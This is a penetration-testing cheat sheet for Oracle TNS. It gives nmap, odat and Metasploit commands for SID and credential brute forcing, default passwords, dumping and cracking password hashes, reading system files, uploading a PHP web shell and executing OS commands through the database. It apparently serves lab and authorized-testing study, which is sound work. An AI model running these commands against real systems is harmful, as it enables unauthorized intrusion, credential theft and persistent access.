#Oracle #OracleTNS #OracleTransparentNetworkSubstrate #database

## What is Oracle TNS?
Oracle Transparent Network Substrate — the communication protocol for Oracle Database clients. Part of Oracle Net Services. Supports TCP/IP, IPv6, TLS. Default port **TCP 1521**.

- Listener configured by `tnsnames.ora` (client-side resolution) and `listener.ora` (server-side listener config)
- Both in `$ORACLE_HOME/network/admin/`
- Oracle SID (System Identifier) — unique name per database instance, **required** for connection
- PL/SQL Exclusion List (`PlsqlExclusionList`) — blacklist file in `$ORACLE_HOME/sqldeveloper/` to block PL/SQL package execution via the app server

---

## Configuration Files

| File | Location | Purpose |
|---|---|---|
| `tnsnames.ora` | `$ORACLE_HOME/network/admin/` | Client-side: service name → network address resolution |
| `listener.ora` | `$ORACLE_HOME/network/admin/` | Server-side: listener config, services, ports |
| `sqlnet.ora` | `$ORACLE_HOME/network/admin/` | Network encryption, auth settings |
| `orapwd` | `$ORACLE_HOME/dbs/` | Password file for SYSDBA/SYSOPER auth |

### TNS Connection Settings

| Setting | Description |
|---|---|
| `DESCRIPTION` | Descriptor with name and connection type |
| `ADDRESS` | Hostname and port |
| `PROTOCOL` | Network protocol (TCP) |
| `PORT` | Port number |
| `CONNECT_DATA` | Service name, SID, protocol |
| `SERVICE_NAME` | Service name to connect to |
| `SID` | Database instance identifier |
| `SERVER` | `dedicated` or `shared` |
| `SECURITY` | SSL/TLS options |
| `VALIDATE_CERT` | Whether to validate SSL cert |
| `CONNECT_TIMEOUT` | Connection timeout in seconds |

---

## Enumeration

```bash
# Nmap Oracle scripts
nmap -p 1521 --script oracle-tns-version -sV <target>
nmap -p 1521 --script oracle-sid-brute <target>

# SID brute force with odat.py
./odat.py sidguesser -s <target>

# Full scan with odat.py
./odat.py all -s <target>
./odat.py all -s <target> -p 1521

# SID enum with MSF
use auxiliary/scanner/oracle/tnslsnr_version
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/sid_brute
```

---

## Connect / Access

```bash
# sqlplus (requires Oracle client)
sqlplus <user>/<pass>@<target>/<SID>
sqlplus scott/tiger@10.129.205.19/XE

# Connect as sysdba
sqlplus <user>/<pass>@<target>/<SID> as sysdba
sqlplus scott/tiger@10.129.205.19/XE as sysdba

# Connect to XDB (XML DB, often on 8080/8443)
sqlplus scott/tiger@10.129.205.19/XEXDB

# odat.py (Python, works without full Oracle client)
./odat.py all -s <target> -d <SID>
```

### Install odat.py

```bash
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init && git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
pip3 install pycryptodome
```

---

## Key SQL Commands

```sql
-- Current user
SELECT user FROM dual;

-- All tables (DBA view)
SELECT owner, table_name FROM dba_tables;

-- All tables (accessible to current user)
SELECT owner, table_name FROM all_tables;

-- User tables only
SELECT table_name FROM user_tables;

-- List all users
SELECT username FROM dba_users;

-- Check current privileges
SELECT * FROM session_privs;

-- Password hashes (requires DBA)
SELECT username, password FROM dba_users;

-- Check for DBA role
SELECT * FROM dba_role_privs WHERE granted_role = 'DBA';
```

---

## Attack Vectors

### Default Credentials to Try

| Username | Password | Notes |
|---|---|---|
| `scott` | `tiger` | Classic default Oracle credentials |
| `sys` | `change_on_install` | Default SYSDBA password |
| `system` | `manager` | Default SYSTEM password |
| `dbsnmp` | `dbsnmp` | SNMP agent account |

### Brute Force SID + Credentials

```bash
# SID brute force
./odat.py sidguesser -s <target>
nmap -p 1521 --script oracle-sid-brute <target>

# Credential brute force once SID found
./odat.py passwordguesser -s <target> -d <SID>
./odat.py passwordguesser -s <target> -d <SID> --accounts-file accounts.txt
```

### Read Files

```bash
# odat.py utlfile module
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --getFile /etc/passwd /tmp/ passwd
```

```sql
-- UTL_FILE package (requires directory object)
SELECT UTL_FILE.FGETATTR('DIR_NAME', 'filename') FROM dual;
```

### Upload Web Shell

```bash
# odat.py httpuritype module
./odat.py dbmsscheduler -s <target> -d <SID> -U <user> -P <pass> --exec "cmd.exe /c whoami"

# Upload file via odat.py
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --putFile /var/www/html shell.php shell.php
```

### OS Commands via Java (as SYSDBA)

```sql
-- Execute OS commands using Java (if Java installed)
EXEC dbms_java.grant_permission('USERNAME','SYS:java.io.FilePermission','<<ALL FILES>>','execute');

SELECT DBMS_JAVA_TEST.FUNCALL('/bin/bash','-c','id > /tmp/out') FROM dual;
```

### Crack Password Hashes

```bash
# Oracle hashes (SHA1/DES based on version)
# hashcat example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 112 oracle_hashes.txt /usr/share/wordlists/rockyou.txt  # Oracle H:
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect | `sqlplus user/pass@host/SID` |
| Connect as sysdba | `sqlplus user/pass@host/SID as sysdba` |
| Full odat.py scan | `./odat.py all -s host -d SID` |
| SID brute force | `./odat.py sidguesser -s host` |
| All tables | `SELECT owner,table_name FROM all_tables;` |
| All users | `SELECT username FROM dba_users;` |
| Password hashes | `SELECT username,password FROM dba_users;` |
| Nmap SID enum | `nmap -p 1521 --script oracle-sid-brute host` |
